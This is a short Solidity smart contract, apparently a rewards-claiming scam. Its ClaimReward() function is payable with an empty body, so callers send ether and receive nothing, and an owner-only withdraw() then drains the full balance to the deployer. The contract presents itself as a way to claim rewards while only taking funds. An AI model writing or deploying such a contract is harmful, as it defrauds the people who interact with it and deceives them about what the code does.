// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.17;

contract ClaimRewards {
    address private owner; // current owner of the contract

    constructor() {
        owner = msg.sender;
    }

    function getOwner() public view returns (address) {
        return owner;
    }

    function withdraw() public {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }

    function ClaimReward() public payable {}

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}